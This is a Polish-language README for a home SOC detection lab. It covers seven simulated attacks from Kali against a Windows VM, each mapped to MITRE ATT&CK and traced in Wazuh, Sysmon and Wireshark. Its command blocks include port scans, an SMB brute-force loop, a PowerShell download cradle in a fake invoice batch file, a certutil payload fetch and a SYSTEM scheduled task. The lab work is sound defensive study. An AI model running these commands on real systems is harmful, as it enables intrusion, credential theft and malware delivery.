# Home SOC Lab - Threat Detection & Log Analysis 111222333444555666

Projekt stworzyłem w celu praktycznego przetestowania mechanizmów detekcji zagrożeń w odizolowanym środowisku sieciowym. Skupiłem się na analizie telemetrii systemowej, korelacji logów w systemie SIEM oraz inspekcji surowych pakietów sieciowych. Całość opiera się na symulacji realnych technik hakerskich i mapowaniu ich do matrycy MITRE ATT&CK.

## Hardware & Host OS

* **System operacyjny hosta:** Windows 10 Pro (64-bit)
* **Procesor (CPU):** Intel(R) Core(TM) i7-2600 CPU @ 3.40GHz
* **Pamięć RAM:** 32,0 GB
* **Dysk:** SSD Patriot P210 512GB

## Software Stack

* **Hiperwzorzec:** Oracle VirtualBox (wersja 7.2.10) – posłużył do stworzenia izolowanej sieci typu Host-Only (`10.0.2.0/24`), całkowicie bezpiecznej dla systemu operacyjnego hosta.
* **SIEM / XDR:** Wazuh Manager (Virtual Appliance oparty na Ubuntu) – `10.0.2.3` (Centralny punkt zbierania i analizy logów).
* **Endpoint (Ofiara):** Windows 10 Pro – `10.0.2.4` (Zainstalowany agent Wazuh oraz sensor Microsoft Sysmon z konfiguracją SwiftOnSecurity).
* **System Atakującego:** Kali Linux – `10.0.2.5` (Platforma do generowania ruchu i symulacji ataków).
* **Analiza Sieciowa:** Wireshark – narzędzie do przechwytywania i analizy surowych pakietów (PCAP).

## Validation & Practical Application

Wierzę, że teoria ma wartość tylko wtedy, gdy można ją zweryfikować w boju. Początkowo wdrożyłem **7 case studies** bezpośrednio w tym pliku, aby szybko przetestować środowisko i upewnić się, że mechanizmy detekcji działają zgodnie z założeniami.

Obecnie, w celu zachowania przejrzystości projektu i ułatwienia nawigacji, proces **Detection Engineering** dla kolejnych przypadków przenoszę do osobnych, dedykowanych plików. Każdy z nich stanowi kompletny cykl: od zainicjowania symulowanego zagrożenia, przez analizę telemetrii, aż po weryfikację logiki detekcji.

## Case Study 1: SMB Reconnaissance & Brute-Force

### 1. Przebieg ataku
Z poziomu maszyny Kali Linux przeprowadziłem szybkie skanowanie portów w poszukiwaniu otwartych usług, a następnie uruchomiłem próbę automatycznego logowania (brute-force) do usługi SMB na maszynie z systemem Windows, celując w lokalne konto Administratora.

* **Skanowanie portów (Nmap):**
    ```bash
    nmap -F 10.0.2.4
    ```
* **Próba uwierzytelnienia SMB (SMBClient):**
    ```bash
    smbclient -L //10.0.2.4 -U administrator%BledneHaslo123!
    ```

### 2. Mapowanie do MITRE ATT&CK

* **Taktyka:** Reconnaissance ([TA0043](https://attack.mitre.org/tactics/TA0043/)) $\rightarrow$ **Technika:** Active Scanning ([T1595](https://attack.mitre.org/techniques/T1595/))
* **Taktyka:** Credential Access ([TA0006](https://attack.mitre.org/tactics/TA0006/)) $\rightarrow$ **Technika:** Brute Force ([T1110](https://attack.mitre.org/techniques/T1110/))

### 3. Detekcja i analiza logów 

#### Logi systemowe: Windows Security Event ID 4625
Agent Wazuh pomyślnie przechwycił i przesłał do bazy log dotyczący nieudanego uwierzytelnienia. W procesie analizy kluczowe były następujące zmienne:
* **Logon Type:** `3` (Network Logon) – potwierdza, że próba logowania nastąpiła przez sieć, a nie lokalnie z konsoli.
* **Source IP:** `10.0.2.5` – wskazuje bezpośrednio na maszynę Kali Linux jako źródło ataku.
* **Target Account:** `administrator`

<img width="719" height="785" alt="wazuh-alert-4625" src="https://github.com/user-attachments/assets/c0955a8e-d576-4d74-b24a-acadb512e29d" />

*Wnioski z wdrożenia:* Podczas pierwszej próby Windows Defender Firewall całkowicie dropował pakiety sieciowe, przez co system nie generował logów audytowych. Dopiero po odpowiedniej rekonfiguracji profili zapory sieciowej telemetria zaczęła poprawnie spływać do SIEM-a.

#### Analiza ruchu sieciowego: Wireshark PCAP
Równolegle z analizą logów systemowych, zweryfikowałem ruch na poziomie pakietów. 

<img width="1440" height="255" alt="wireshark-smb-attack" src="https://github.com/user-attachments/assets/f620a488-3b25-4872-b09a-47d685ab6f1d" />

Filtrowanie protokołu `smb` wykazało sekwencję pakietów negocjacji sesji, która zakończyła się jednoznacznym komunikatem ze strony serwera Windows: `STATUS_LOGON_FAILURE`. To bezpośredni, sieciowy dowód korelujący z Event ID 4625 z logów hosta.

## Case Study 2: PowerShell Reverse Shell & Execution Detection

### 1. Przebieg ataku 

W celu zsymulowania fazy poeksploatacyjnej (Post-Exploitation), na maszynie ofiary uruchomiłem skrypt mapujący surowe gniazdo TCP z powrotem do maszyny atakującego, co pozwala na zdalne wykonywanie komend w systemie operacyjnym (Reverse Shell).

* **Nasłuch na Kali (Netcat):**
    ```bash
    nc -lvnp 4444
    ```
* **Komenda uruchomiona na Windowsie:**
    Wykorzystałem jednolinijkowy skrypt PowerShell tworzący obiekt `System.Net.Sockets.TCPClient` kierujący ruch na adres `10.0.2.5:4444`.

### 2. Mapowanie do MITRE ATT&CK

* **Taktyka:** Execution ([TA0002](https://attack.mitre.org/tactics/TA0002/)) $\rightarrow$ **Technika:** Command and Scripting Interpreter: PowerShell ([T1059.001](https://attack.mitre.org/techniques/T1059/001/))
* **Taktyka:** Command and Control ([TA0011](https://attack.mitre.org/tactics/TA0011/)) $\rightarrow$ **Technika:** Application Layer Protocol ([T1071](https://attack.mitre.org/techniques/T1071/))

### 3. Detekcja i analiza logów 

#### Logi systemowe: Sysmon Event ID 1 (Process Creation)
Podczas testów napotkałem mechanizm ochronny Windows Defender (AMSI), który blokował wykonanie skryptu bezpośrednio w konsoli PowerShell. Po tymczasowym wyłączeniu ochrony w czasie rzeczywistym w celu dokończenia symulacji, sensor Sysmon zarejestrował zdarzenie utworzenia procesu.

<img width="1483" height="291" alt="wazuh-sysmon-event1-powershell-execution_1" src="https://github.com/user-attachments/assets/021baabe-b189-4b69-9778-ea40466a132e" />
<img width="1489" height="183" alt="wazuh-sysmon-event1-powershell-execution_2" src="https://github.com/user-attachments/assets/c23123e9-d5b3-4b68-ae15-314b4848b337" />

*Analiza mechanizmu Sysmon:* Wklejenie złośliwego kodu bezpośrednio do otwartej wcześniej konsoli PowerShell nie generuje nowego Event ID 1 (ponieważ nie powstaje nowy proces, kod wykonuje się wewnątrz istniejącego PID). Aby poprawnie udokumentować to zdarzenie w SIEM, wywołałem skrypt z poziomu klasycznego Wiersza poleceń (`cmd.exe`), wymuszając flagę `-Command`. Dzięki temu pole `data.win.eventdata.commandLine` w pełni ujawniło cały złośliwy payload sieciowy wraz z zakodowanym adresem IP atakującego.

## Case Study 3: Scheduled Task Persistence & Execution Detection

### 1. Przebieg ataku 

To zadanie stanowi bezpośrednią kontynuację działań poeksploatacyjnych. Wykorzystując aktywną sesję Reverse Shell na maszynie Kali Linux (`10.0.2.5`), przesłałem zdalnie do przejętego systemu Windows (`10.0.2.4`) komendę tworzącą złośliwy wpis w Harmonogramie Zadań. Celem adwersarza było zapewnienie stałego, ukrytego powrotu do systemu (Persistence) z najwyższymi uprawnieniami.

* **Zdalna egzekucja z poziomu Kali Linux (wewnątrz aktywnej sesji hakerskiej):**
    ```cmd
    schtasks /create /tn "WindowsMaliciousUpdate" /tr "powershell.exe -nop -w hidden -c Get-Process" /sc minute /mo 5 /ru "SYSTEM"
    ```
    
### 2. Mapowanie do MITRE ATT&CK

* **Taktyka:** Persistence ([TA0003](https://attack.mitre.org/tactics/TA0003/)) $\rightarrow$ **Technika:** Scheduled Task/Job: Scheduled Task ([T1053.005](https://attack.mitre.org/techniques/T1053/005/))

### 3. Detekcja i analiza logów 

#### Logi systemowe: Sysmon Event ID 1 

Użycie natywnych narzędzi administracyjnych Windows (techniki *Living off the Land*) często omija podstawowe reguły antywirusowe. Podczas analizy w środowisku SIEM, samo utworzenie zadania przez administratora nie wywołało domyślnego alertu o wysokim priorytecie. Kluczowy moment detekcji nastąpił jednak w fazie egzekucji (Execution), gdy usługa systemowa podjęła próbę uruchomienia zdefiniowanego skryptu.

Sensor Sysmon zarejestrował zdarzenie jako utworzenie nowego procesu przez system (Event ID 1) z następującą telemetrią:

* **Uruchomiony proces:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
* **Kontekst użytkownika:** `ZARZĄDZANIE NT\SYSTEM` (Eskalacja do najwyższych uprawnień systemowych)
* **Proces nadrzędny (Parent Image):** `C:\Windows\System32\svchost.exe` uruchamiany przez usługę systemową Harmonogramu Zadań (`-s Schedule`).

  <img width="925" height="675" alt="wazuh-persistence-execution" src="https://github.com/user-attachments/assets/a226a2bb-48a1-4645-b478-c9bd731bf7bf" />

*Wnioski z analizy:* Uruchomienie konsoli PowerShell bezpośrednio przez proces `svchost.exe` (Schedule) w kontekście konta `SYSTEM` to podręcznikowy wskaźnik anomalii procesowej. W realnym środowisku produkcyjnym taki schemat zachowania natychmiast kwalifikuje hosta do pełnej izolacji sieciowej, ponieważ potwierdza udane złośliwe zagnieżdżenie się w systemie i eskalację uprawnień.

## Case Study 4: TCP SYN Stealth Scan & Packet Inspection (Wireshark Forensics)

### 1. Przebieg ataku
W celu zidentyfikowania aktywnych usług na maszynie ofiary (`10.0.2.4`) bez ustanawiania pełnego połączenia TCP (co mogłoby wygenerować głośne alerty w systemach aplikacyjnych), z poziomu maszyny Kali Linux (`10.0.2.5`) przeprowadziłem ukryte skanowanie portów typu **TCP SYN Stealth Scan**. Atak został ukierunkowany na kluczowe porty infrastrukturalne Windows: 135 (RPC) oraz 445 (SMB).

* **Egzekucja skanowania z poziomu Kali Linux:**
    ```bash
    sudo nmap -sS -p 135,445 10.0.2.4
    ```

### 2. Mapowanie do MITRE ATT&CK

* **Taktyka:** Discovery ([TA0007](https://attack.mitre.org/tactics/TA0007/)) $\rightarrow$ **Technika:** Network Service Discovery ([T1046](https://attack.mitre.org/techniques/T1046/))

### 3. Detekcja i analiza ruchu sieciowego

#### Analiza pakietów: Wireshark PCAP

Podczas gdy tradycyjne logi systemu hosta rzadko odnotowują niedokończone próby połączeń na warstwie aplikacji, analiza surowego ruchu sieciowego w Wiresharku pozwoliła na natychmiastowe zidentyfikowanie anomalii behawioralnej w protokole TCP.

Filtrowanie ruchu za pomocą reguły `ip.addr == 10.0.2.4 and tcp` ujawniło powtarzający się, nienaturalny wzorzec komunikacji dla badanych portów (np. portu 445):

1. **`Kali -> Windows [SYN]`**: Adwersarz wysyła pakiet inicjujący połączenie.
2. **`Windows -> Kali [SYN, ACK]`**: Host docelowy potwierdza gotowość i wskazuje, że port jest otwarty.
3. **`Kali -> Windows [RST]`**: Zamiast wysłania standardowego pakietu `ACK` kończącego klasyczny proces *TCP Three-Way Handshake*, maszyna atakująca natychmiach wysyła flagę **RST (Reset)**, brutalnie przerywając sesję.

<img width="1585" height="441" alt="wireshark-syn-scan" src="https://github.com/user-attachments/assets/661a5cb0-d477-4985-833e-791b6b1ecd91" />

*Wnioski z analizy:* Masowe pojawianie się pakietów `RST` bezpośrednio po otrzymaniu odpowiedzi `SYN-ACK` z danego adresu IP to jednoznaczny, sieciowy wskaźnik intruzji (IoC) wskazujący na zautomatyzowane skanowanie środowiska. W systemach klasy Network Detection and Response (NDR) lub na zaporach sieciowych, wykrycie takiej sekwencji z jednego źródła w krótkim oknie czasowym automatycznie wyzwala regułę progową i skutkuje natychmiastowym zablokowaniem IP napastnika.

## Case Study 5: Ingress Tool Transfer & LOLBins (Certutil)

### 1. Przebieg ataku

Celem tego ataku była symulacja pobrania złośliwego pliku (payloadu) z serwera kontrolowanego przez atakującego na maszynę ofiary. Aby uniknąć wykrycia przez proste mechanizmy monitorujące ruch z przeglądarek internetowych, wykorzystałem zaufane narzędzie administracyjne Windows – `certutil.exe`. Narzędzie to domyślnie służy do zarządzania certyfikatami, jednak posiada wbudowaną funkcję pobierania plików z sieci, co adwersarze często wykorzystują. 

* **Przygotowanie serwera na Kali Linux (10.0.2.5):**
    Wygenerowałem testowy plik wykonywalny i uruchomiłem prosty serwer HTTP w Pythonie, aby udostępnić go w sieci lokalnej.
    ```bash
    echo "Zlosliwy kod" > malware.exe
    python3 -m http.server 80
    ```

* **Pobranie pliku z poziomu Windows (10.0.2.4):**
    Na maszynie ofiary uruchomiłem klasyczny Wiersz polecenia (`cmd.exe`) i wykonałem polecenie wymuszające pobranie pliku z ominięciem cache'u, zapisując go bezpośrednio do publicznego folderu.
    ```cmd
    certutil.exe -urlcache -split -f "[http://10.0.2.5/malware.exe](http://10.0.2.5/malware.exe)" C:\Users\Public\malware.exe
    ```

### 2. Mapowanie do MITRE ATT&CK

* **Taktyka:** Command and Control ([TA0011](https://attack.mitre.org/tactics/TA0011/)) $\rightarrow$ **Technika:** Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))
* **Taktyka:** Defense Evasion ([TA0005](https://attack.mitre.org/tactics/TA0005/)) $\rightarrow$ **Technika:** System Binary Proxy Execution ([T1218](https://attack.mitre.org/techniques/T1218/))

### 3. Detekcja i analiza logów

#### Logi systemowe: Sysmon Event ID 1 (Process Creation)

Agent Wazuh bezbłędnie wychwycił anomalię związaną z użyciem narzędzia `certutil.exe`. Analiza szczegółów logu w systemie SIEM ujawniła argumenty wiersza poleceń, które jednoznacznie wskazują na intencję pobrania pliku z zewnętrznego źródła.

* **Image:** `C:\Windows\System32\certutil.exe`
* **CommandLine:** Obiekty `-urlcache`, `-split` oraz `-f` w połączeniu z zewnętrznym adresem IP atakującego to klasyczna sygnatura nadużycia tego narzędzia.

<img width="877" height="571" alt="certutil" src="https://github.com/user-attachments/assets/13410b5e-501b-4f3f-8f54-064d77c39dfd" />

#### Analiza ruchu sieciowego: Wireshark PCAP
Dodatkowo przeanalizowałem ruch sieciowy, nasłuchując na interfejsie maszyny. Filtrowanie protokołu `http` ukazało jawne zapytanie `GET /malware.exe HTTP/1.1`. 

Kluczowym znaleziskiem w warstwie aplikacji (nagłówki HTTP) było pole `User-Agent`, które przedstawiło się jako `CertUtil URL Agent`. Stanowi to bardzo mocny wskaźnik kompromitacji (IoC) na poziomie sieci, który pozwala na łatwe stworzenie reguły blokującej w systemach IDS/IPS (np. Suricata lub Snort).

<img width="1043" height="742" alt="wireshark" src="https://github.com/user-attachments/assets/333f6a32-4a83-4b80-8676-6fcdfb04f9d0" />


*Wnioski z analizy:* Narzędzia typu LOLBins stanowią ogromne wyzwanie dla klasycznych systemów antywirusowych, ponieważ sam plik `certutil.exe` jest podpisany przez Microsoft i w pełni zaufany. Skuteczna detekcja opiera się tutaj wyłącznie na monitorowaniu behawioralnym – korelacji uruchamianego procesu z jego nietypowymi argumentami (wiersz poleceń) oraz na wychwytywaniu anomalii sieciowych w warstwie aplikacji (specyficzny User-Agent).

## Case Study 6: Malicious Dropper

### 1. Przebieg ataku

Ten scenariusz odwzorowuje jedno z najczęstszych zdarzeń obsługiwanych przez analityków SOC pierwszej linii. Symulacja polegała na wykonaniu przez użytkownika złośliwego załącznika z wiadomości phishingowej (pliku typu `.bat` ucharakteryzowanego na fakturę), który w tle cicho uruchamia interpreter PowerShell w celu pobrania i zapisania docelowego złośliwego oprogramowania z serwera C2 kontrolowanego przez atakującego.

* **Nasłuch na serwerze C2 (Kali Linux - 10.0.2.5):**
  Uruchomiłem prosty serwer HTTP w Pythonie, symulujący infrastrukturę przestępców hostującą złośliwy plik docelowy (payload).
  ```bash
  python3 -m http.server 80
  ```

* **Egzekucja i pobranie (Windows 10 - 10.0.2.4):**
  Na stacji roboczej ofiary utworzyłem i uruchomiłem plik `Faktura_Zalegla.bat`, zawierający popularny wektor *PowerShell Download Cradle*:
  ```bat
  powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri [http://10.0.2.5/payload.exe](http://10.0.2.5/payload.exe) -OutFile C:\Users\Public\payload.exe"
  ```
  Z perspektywy użytkownika po kliknięciu pliku pojawiło się jedynie błyskawiczne mignięcie czarnego okna konsoli.

### 2. Mapowanie do MITRE ATT&CK

* **Taktyka:** Initial Access ([TA0001](https://attack.mitre.org/tactics/TA0001/)) $\rightarrow$ **Technika:** Phishing: Spearphishing Attachment ([T1566.001](https://attack.mitre.org/techniques/T1566/001/))
* **Taktyka:** Execution ([TA0002](https://attack.mitre.org/tactics/TA0002/)) $\rightarrow$ **Technika:** Command and Scripting Interpreter: PowerShell ([T1059.001](https://attack.mitre.org/techniques/T1059/001/))

### 3. Detekcja i analiza logów 

#### Logi systemowe: Sysmon Event ID 1 (Process Creation)

Podczas wstępnego triagu alertu (Initial Triage), kluczowe było przeanalizowanie **Drzewa Procesów (Process Tree)**, aby zrozumieć, co dokładnie zainicjowało zdarzenie. Agent Wazuh przesłał telemetrię z Sysmona, z której wyciągnąłem następujące Wskaźniki Kompromitacji (IoC):

* **ParentImage (Proces nadrzędny):** `C:\Windows\System32\cmd.exe` (Wskazuje to na fakt, że PowerShell nie został uruchomiony bezpośrednio z menu Start przez użytkownika, lecz został wywołany z poziomu skryptu wykonawczego).
* **Image (Proces potomny):** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
* **CommandLine:** Zarejestrowana komenda zawierała jawną próbę obejścia polityk bezpieczeństwa (`-ExecutionPolicy Bypass`), ukrycia okna przed ofiarą (`-WindowStyle Hidden`) oraz adres zewnętrznego serwera, z którego pobierany był złośliwy ładunek.

<img width="820" height="630" alt="powershell" src="https://github.com/user-attachments/assets/51908c29-8535-43c1-8977-d85decd221b7" />

*Wnioski z analizy (Działania SOC L1):* W realnym środowisku produkcyjnym taki obraz logów to natychmiastowe potwierdzenie (True Positive) incydentu o wysokim priorytecie. Identyfikacja flag takich jak `-WindowStyle Hidden` czy metody `Invoke-WebRequest` w linii poleceń pozwala na szybkie powiązanie alertu z aktywnością typu Dropper. Prawidłowa reakcja L1 w tym przypadku obejmowałaby eskalację zgłoszenia, zablokowanie adresu IP serwera C2 na zaporze ogniowej oraz natychmiastową izolację sieciową stacji roboczej hosta, aby zapobiec rozprzestrzenianiu się infekcji.

## Case Study 7: Credential Access (Brute Force Attack)

### 1. Przebieg ataku

Drugim z najczęstszych zadań analityka SOC jest monitorowanie i klasyfikowanie alertów związanych z uwierzytelnianiem. W tej symulacji odtworzyłem scenariusz, w którym złośliwy aktor przeprowadza atak siłowy (Brute Force / Dictionary Attack) na usługę logowania (SMB) systemu Windows w celu uzyskania początkowego dostępu.

* **Atak (Kali Linux - 10.0.2.5):**
  Wykorzystałem niestandardowy skrypt w powłoce Bash (wykorzystujący narzędzie `smbclient`) oraz spreparowany słownik `passwords.txt`, aby uderzyć w protokół logowania maszyny ofiary.
  ```bash
  for p in $(cat passwords.txt); do smbclient -L //10.0.2.4 -U "user%$p"; done

### 2.Mapowanie do MITRE ATT&CK

* **Taktyka:** Credential Access ([TA0006](https://attack.mitre.org/tactics/TA0006/)) -> **Technika:** Brute Force: Password Guessing ([T1110.001](https://attack.mitre.org/techniques/T1110/001/))
* **Taktyka:** Initial Access ([TA0001](https://attack.mitre.org/tactics/TA0001/)) -> **Technika:** Valid Accounts: Local Accounts ([T1078.003](https://attack.mitre.org/techniques/T1078/003/))

### 3.Detekcja i analiza logów 

#### Logi systemowe: Event ID 4625 (Logon Failure), 4740 (Account Lockout) oraz 4624 (Logon Success)
W ramach wstępnego triagu alertów z systemu Wazuh SIEM przeanalizowałem zdarzenia logowania do systemu z podejrzanego źródła. Do korelacji użyłem kluczowych logów bezpieczeństwa Windows:

* **Wzorzec ataku:** Zaobserwowałem gwałtowny skok zdarzeń oznaczonych jako **Event ID 4625**, wskazujących na seryjne błędne próby podania hasła. Zaobserwowano również log **Event ID 4740**, potwierdzający tymczasowe zablokowanie konta przez system.
* **Wskaźniki Kompromitacji (IoC):** Wszystkie żądania pochodziły z jednego adresu IP, co wykluczyło scenariusz False Positive. Pole `IpAddress` wskazywało na zewnętrzny adres `10.0.2.5`.
* **Przełamanie zabezpieczeń (Successful Compromise):** Kluczowym punktem analizy było zidentyfikowanie na osi czasu zdarzenia **Event ID 4624** (Logon Success), które wystąpiło bezpośrednio po serii błędów i pochodziło z tego samego adresu IP atakującego (`10.0.2.5`). 

<img width="798" height="827" alt="vent1" src="https://github.com/user-attachments/assets/d9394911-ff53-4f54-befd-b47be18dfc58" />

<img width="905" height="819" alt="VENT" src="https://github.com/user-attachments/assets/a6015101-7066-4a51-962b-e561d342a020" />

*Wnioski z analizy:* Obecność zdarzenia 4624 w następstwie logów 4625 stanowi bezwzględne potwierdzenie skutecznego przełamania hasła (True Positive). Procedura reakcji L1 wymaga:

1. Izolacji sieciowej hosta.
2. Zablokowania adresu IP `10.0.2.5` na zaporze brzegowej.
3. Eskalacji incydentu, wymuszenia rotacji haseł oraz przeglądu aktywności użytkownika.
